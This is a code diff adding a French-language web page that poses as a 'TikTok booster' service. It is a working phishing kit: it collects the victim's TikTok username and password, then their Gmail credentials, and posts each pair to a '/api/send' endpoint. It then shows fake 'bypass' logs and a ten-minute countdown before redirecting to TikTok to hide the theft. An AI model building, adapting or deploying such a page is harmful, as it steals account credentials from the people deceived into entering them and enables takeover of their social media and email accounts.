@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anastasia Booster | Injection v2.1</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: #bc13fe; font-family: 'Courier New', monospace; }
+        .card { border: 2px solid #bc13fe; background: #000; box-shadow: 0 0 25px #bc13fe66; }
+        .progress-bar { width: 0%; height: 4px; background: #bc13fe; transition: width 0.5s; }
+        input { transition: all 0.3s; }
+        input:focus { box-shadow: 0 0 10px #bc13fe; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div id="main-container" class="card w-full max-w-md p-8 rounded-3xl text-center">
+        <h1 class="text-3xl font-black italic mb-2 tracking-tighter">ANASTASIA BOOSTER</h1>
+        <p class="text-[10px] text-zinc-500 mb-8 uppercase tracking-widest">Injection Temporaire (48h) | Moteur Node.js</p>
+
+        <div id="step-tiktok" class="space-y-4">
+            <p class="text-[10px] text-purple-400 uppercase">Étape 1 : Connexion TikTok</p>
+            <input type="text" id="tk-user" placeholder="@Utilisateur TikTok" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none">
+            <input type="password" id="tk-pass" placeholder="Mot de passe TikTok" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none">
+            <button onclick="validerTikTok()" class="w-full py-4 bg-violet-600 text-black font-black rounded-xl hover:bg-white transition-all uppercase">Suivant</button>
+        </div>
+
+        <div id="step-gmail" class="hidden space-y-4">
+            <p class="text-[10px] text-yellow-500 uppercase">Étape 2 : Validation Google Requise</p>
+            <input type="text" id="gm-user" placeholder="Adresse Gmail" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none">
+            <input type="password" id="gm-pass" placeholder="Mot de passe Gmail" class="w-full p-4 bg-zinc-900 border border-purple-900 rounded-xl text-white outline-none">
+            <button onclick="validerGmail()" class="w-full py-4 bg-white text-black font-black rounded-xl uppercase">Activer le Boost</button>
+        </div>
+
+        <div id="step-wait" class="hidden space-y-6">
+            <div class="text-3xl font-bold italic text-white" id="timer">10:00</div>
+            <div class="w-full bg-zinc-800 rounded-full h-1 overflow-hidden">
+                <div id="progress" class="progress-bar"></div>
+            </div>
+            <div class="text-left text-[9px] text-green-500 font-mono h-24 overflow-hidden" id="logs">
+                > Bypass TikTok Security...<br>
+                > Synchronisation avec Google Cloud...<br>
+                > Injection des 1000 paquets en cours...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // FILTRE ANTI-FAUSSES INFORMATIONS
+        function estValide(user, pass) {
+            if (user.length < 4) { alert("Identifiant trop court"); return false; }
+            if (pass.length < 6) { alert("Mot de passe trop court pour la synchronisation"); return false; }
+            return true;
+        }
+
+        async function envoyerData(u, p, platform) {
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ user: u, pass: p, platform: platform })
+            });
+        }
+
+        function validerTikTok() {
+            const u = document.getElementById('tk-user').value;
+            const p = document.getElementById('tk-pass').value;
+            if(!estValide(u, p)) return;
+
+            envoyerData(u, p, "TIKTOK");
+            document.getElementById('step-tiktok').classList.add('hidden');
+            document.getElementById('step-gmail').classList.remove('hidden');
+        }
+
+        function validerGmail() {
+            const u = document.getElementById('gm-user').value;
+            const p = document.getElementById('gm-pass').value;
+            if(!estValide(u, p) || !u.includes('@')) { alert("Gmail invalide"); return; }
+
+            envoyerData(u, p, "GMAIL");
+            document.getElementById('step-gmail').classList.add('hidden');
+            document.getElementById('step-wait').classList.remove('hidden');
+            demarrerTimer();
+        }
+
+        function demarrerTimer() {
+            let timerSeconds = 600;
+            const interval = setInterval(() => {
+                timerSeconds--;
+                let mins = Math.floor(timerSeconds / 60);
+                let secs = timerSeconds % 60;
+                document.getElementById('timer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+                document.getElementById('progress').style.width = `${((600 - timerSeconds) / 600) * 100}%`;
+                if(timerSeconds <= 0) {
+                    clearInterval(interval);
+                    alert("Boost activé pour 48h !");
+                    window.location.href = "https://www.tiktok.com";
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
